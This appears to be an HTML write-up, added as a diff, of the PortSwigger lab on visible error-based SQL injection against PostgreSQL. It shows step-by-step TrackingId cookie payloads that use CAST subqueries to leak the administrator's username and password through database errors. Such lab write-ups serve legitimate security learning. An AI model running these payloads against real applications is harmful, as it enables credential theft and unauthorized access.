@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PortSwigger Web Security Academy - Visible Error-Based SQL Injection</title>
+
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      line-height: 1.7;
+      color: #222;
+      background: #f5f7fa;
+      margin: 0;
+      padding: 40px 20px;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+    }
+
+    h1 {
+      color: #173d39;
+      margin-top: 0;
+      border-bottom: 3px solid #2f855a;
+      padding-bottom: 12px;
+    }
+
+    h2 {
+      color: #173d39;
+      margin-top: 35px;
+    }
+
+    h3 {
+      color: #2f855a;
+      margin-top: 25px;
+    }
+
+    code {
+      background: #f1f3f5;
+      padding: 3px 6px;
+      border-radius: 4px;
+      font-family: Consolas, Monaco, monospace;
+      color: #b42318;
+    }
+
+    pre {
+      background: #1e1e1e;
+      color: #f8f8f2;
+      padding: 18px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, Monaco, monospace;
+      line-height: 1.5;
+    }
+
+    .info {
+      background: #eef7f2;
+      border-left: 5px solid #2f855a;
+      padding: 15px 20px;
+      margin: 20px 0;
+      border-radius: 5px;
+    }
+
+    .warning {
+      background: #fff7ed;
+      border-left: 5px solid #f97316;
+      padding: 15px 20px;
+      margin: 20px 0;
+      border-radius: 5px;
+    }
+
+    .result {
+      background: #f0fdf4;
+      border-left: 5px solid #16a34a;
+      padding: 15px 20px;
+      margin: 20px 0;
+      border-radius: 5px;
+    }
+
+    ul, ol {
+      padding-left: 25px;
+    }
+
+    .tag {
+      display: inline-block;
+      background: #e8f5e9;
+      color: #256029;
+      padding: 5px 10px;
+      margin: 3px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    .flow {
+      text-align: center;
+      background: #f8fafc;
+      padding: 25px;
+      border-radius: 8px;
+      margin-top: 20px;
+      font-family: Consolas, Monaco, monospace;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h1>PortSwigger Web Security Academy: Visible Error-Based SQL Injection</h1>
+
+  <div>
+    <span class="tag">Practitioner</span>
+    <span class="tag">PostgreSQL</span>
+    <span class="tag">SQL Injection</span>
+    <span class="tag">Error-Based SQLi</span>
+  </div>
+
+  <h2>Lab Overview</h2>
+
+  <p>
+    <strong>Lab:</strong> Visible error-based SQL injection
+  </p>
+
+  <p>
+    <strong>Difficulty:</strong> Practitioner
+  </p>
+
+  <p>
+    <strong>Vulnerability:</strong> Error-based SQL Injection
+  </p>
+
+  <p>
+    <strong>Database:</strong> PostgreSQL
+  </p>
+
+  <p>
+    <strong>Objective:</strong> Extract the administrator's password from the
+    <code>users</code> table and log in as the administrator.
+  </p>
+
+  <div class="info">
+    <strong>Learning environment:</strong>
+    This technique was performed against an intentionally vulnerable
+    PortSwigger Web Security Academy lab.
+  </div>
+
+  <h2>1. Understanding the Vulnerability</h2>
+
+  <p>
+    The application uses a <code>TrackingId</code> cookie for analytics.
+    The value of this cookie is incorporated into a SQL query.
+  </p>
+
+  <p>
+    The important observation was that the application returned
+    <strong>verbose database error messages</strong> when the SQL query
+    was malformed.
+  </p>
+
+  <p>
+    This created an opportunity to use the database's error messages as an
+    <strong>information disclosure channel</strong>.
+  </p>
+
+  <p>
+    The database contained a <code>users</code> table with:
+  </p>
+
+  <pre>username
+password</pre>
+
+  <p>
+    The goal was to make the database return the contents of these columns
+    inside an error message.
+  </p>
+
+  <h2>2. Confirming SQL Injection</h2>
+
+  <p>
+    The first step was to modify the <code>TrackingId</code> cookie by adding
+    a single quote:
+  </p>
+
+  <pre>TrackingId=Eh6LtTmmmvORpiE9'</pre>
+
+  <p>
+    This caused a SQL error indicating that our input was being inserted
+    inside a quoted SQL string.
+  </p>
+
+  <p>
+    This confirmed that the <code>TrackingId</code> value was potentially
+    injectable.
+  </p>
+
+  <h2>3. Closing the String and Commenting the Query</h2>
+
+  <p>
+    We then added a SQL comment:
+  </p>
+
+  <pre>TrackingId=Eh6LtTmmmvORpiE9'--</pre>
+
+  <p>
+    The important payload component was:
+  </p>
+
+  <pre>'--</pre>
+
+  <p>
+    The single quote closes the application's existing SQL string, while
+    <code>--</code> comments out the remainder of the SQL query.
+  </p>
+
+  <p>
+    The absence of the previous syntax error indicated that the resulting
+    query was syntactically valid.
+  </p>
+
+  <h2>4. Testing a CAST-Based Error</h2>
+
+  <p>
+    The next step was to determine whether we could deliberately generate
+    a database conversion error.
+  </p>
+
+  <pre>TrackingId=Eh6LtTmmmvORpiE9' AND 1=CAST((SELECT 1) AS int)--</pre>
+
+  <p>
+    The important SQL expression was:
+  </p>
+
+  <pre>AND 1=CAST((SELECT 1) AS int)</pre>
+
+  <p>
+    <code>SELECT 1</code> returns the integer <code>1</code>, so casting it
+    to an integer succeeds.
+  </p>
+
+  <p>
+    The request returned the normal application response:
+  </p>
+
+  <pre>HTTP/2 200 OK</pre>
+
+  <p>
+    This demonstrated that the injected SQL expression was being executed
+    successfully.
+  </p>
+
+  <h2>5. Extracting the Username</h2>
+
+  <p>
+    We then replaced the test value with a query for the username:
+  </p>
+
+  <pre>TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</pre>
+
+  <p>
+    The <code>LIMIT 1</code> was important because:
+  </p>
+
+  <pre>SELECT username FROM users</pre>
+
+  <p>
+    could potentially return multiple rows. We needed the subquery to
+    return a single value.
+  </p>
+
+  <div class="result">
+    <strong>Database error:</strong>
+    <pre>ERROR: invalid input syntax for type integer: "administrator"</pre>
+  </div>
+
+  <p>
+    This was the critical result.
+  </p>
+
+  <p>
+    PostgreSQL attempted to cast:
+  </p>
+
+  <pre>administrator</pre>
+
+  <p>
+    to an integer:
+  </p>
+
+  <pre>CAST('administrator' AS int)</pre>
+
+  <p>
+    Since <code>administrator</code> is not a valid integer, PostgreSQL
+    generated an error containing the offending value.
+  </p>
+
+  <p>
+    Therefore, we successfully extracted the first username:
+  </p>
+
+  <pre>administrator</pre>
+
+  <h2>6. Extracting the Administrator Password</h2>
+
+  <p>
+    Once we knew that the administrator was the first user returned by the
+    query, we changed the selected column from <code>username</code> to
+    <code>password</code>.
+  </p>
+
+  <pre>TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</pre>
+
+  <p>
+    The important SQL logic was:
+  </p>
+
+  <pre>SELECT password FROM users LIMIT 1</pre>
+
+  <p>
+    PostgreSQL attempted to cast the returned password to an integer.
+    Because the password was not an integer, the conversion failed and
+    the database error exposed the offending value.
+  </p>
+
+  <div class="result">
+    <strong>Result:</strong>
+    The administrator's password was disclosed through the PostgreSQL
+    conversion error.
+  </div>
+
+  <h2>7. Why the Attack Worked</h2>
+
+  <p>
+    The attack relied on three important conditions.
+  </p>
+
+  <h3>1. SQL Injection</h3>
+
+  <p>
+    The <code>TrackingId</code> cookie was incorporated into a SQL query
+    without being safely parameterized.
+  </p>
+
+  <h3>2. Database Errors Were Exposed</h3>
+
+  <p>
+    Instead of returning a generic error to the user, the application
+    exposed the underlying PostgreSQL error.
+  </p>
+
+  <h3>3. CAST Was Used to Force Data into the Error</h3>
+
+  <p>
+    We deliberately caused the database to perform:
+  </p>
+
+  <pre>CAST(&lt;database value&gt; AS int)</pre>
+
+  <p>
+    When the value was a string such as:
+  </p>
+
+  <pre>administrator</pre>
+
+  <p>
+    PostgreSQL reported the offending value in its error message.
+  </p>
+
+  <p>
+    This transformed a potentially blind SQL injection into a
+    <strong>visible error-based SQL injection</strong>.
+  </p>
+
+  <h2>8. Payload Progression</h2>
+
+  <h3>Step 1 — Trigger an SQL Error</h3>
+
+  <pre>TrackingId=Eh6LtTmmmvORpiE9'</pre>
+
+  <p><strong>Purpose:</strong></p>
+
+  <pre>Confirm that the cookie value is inside a SQL string.</pre>
+
+  <h3>Step 2 — Close the String and Comment the Remainder</h3>
+
+  <pre>TrackingId=Eh6LtTmmmvORpiE9'--</pre>
+
+  <p><strong>Purpose:</strong></p>
+
+  <pre>Make the injected SQL syntactically valid.</pre>
+
+  <h3>Step 3 — Test the CAST Technique</h3>
+
+  <pre>TrackingId=Eh6LtTmmmvORpiE9' AND 1=CAST((SELECT 1) AS int)--</pre>
+
+  <p><strong>Purpose:</strong></p>
+
+  <pre>Confirm that a CAST-based SQL expression can be executed.</pre>
+
+  <h3>Step 4 — Extract the Username</h3>
+
+  <pre>TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</pre>
+
+  <p><strong>Result:</strong></p>
+
+  <pre>ERROR: invalid input syntax for type integer: "administrator"</pre>
+
+  <h3>Step 5 — Extract the Password</h3>
+
+  <pre>TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</pre>
+
+  <p><strong>Result:</strong></p>
+
+  <pre>ERROR: invalid input syntax for type integer: "&lt;administrator-password&gt;"</pre>
+
+  <h2>9. Authentication</h2>
+
+  <p>
+    After obtaining the password, we used the extracted credentials to
+    authenticate as the administrator:
+  </p>
+
+  <pre>Username: administrator
+Password: &lt;extracted password&gt;</pre>
+
+  <p>
+    Logging in with these credentials completed the lab.
+  </p>
+
+  <h2>10. Key Lessons Learned</h2>
+
+  <ul>
+    <li>
+      SQL injection can occur through HTTP cookies, not only URL parameters
+      or form fields.
+    </li>
+    <li>
+      A verbose database error can become an information disclosure
+      mechanism.
+    </li>
+    <li>
+      The single quote was used to escape the application's SQL string.
+    </li>
+    <li>
+      <code>--</code> was used to comment out the remainder of the original
+      SQL query.
+    </li>
+    <li>
+      <code>SELECT</code> subqueries can retrieve data from another table.
+    </li>
+    <li>
+      <code>LIMIT 1</code> is useful when a scalar subquery must return only
+      one row.
+    </li>
+    <li>
+      <code>CAST()</code> can deliberately trigger a database conversion
+      error.
+    </li>
+    <li>
+      PostgreSQL's error message revealed the value that failed the
+      conversion.
+    </li>
+    <li>
+      Error-based SQL injection can extract sensitive information even when
+      query results are not normally displayed.
+    </li>
+  </ul>
+
+  <h2>Final Attack Chain</h2>
+
+  <div class="flow">
+    SQL Injection
+    <br>↓<br>
+    Close existing SQL string
+    <br>↓<br>
+    Comment out original query
+    <br>↓<br>
+    Inject SELECT subquery
+    <br>↓<br>
+    CAST returned value to integer
+    <br>↓<br>
+    Trigger PostgreSQL conversion error
+    <br>↓<br>
+    Database includes offending value in error
+    <br>↓<br>
+    Extract username
+    <br>↓<br>
+    Extract password
+    <br>↓<br>
+    Login as administrator
+  </div>
+
+  <h2>Conclusion</h2>
+
+  <p>
+    This lab demonstrated how seemingly harmless verbose database errors
+    can completely undermine an application's security.
+  </p>
+
+  <p>
+    Although the application did not directly display the results of the
+    SQL query, the database error messages provided an alternative channel
+    for extracting sensitive information.
+  </p>
+
+  <p>
+    The core technique was to deliberately force a type-conversion failure
+    using:
+  </p>
+
+  <pre>CAST((SELECT &lt;column&gt; FROM users LIMIT 1) AS int)</pre>
+
+  <p>
+    By first extracting the username and then replacing
+    <code>username</code> with <code>password</code>, we were able to
+    retrieve the administrator credentials and successfully complete the
+    lab.
+  </p>
+
+</div>
+
+</body>
+</html>
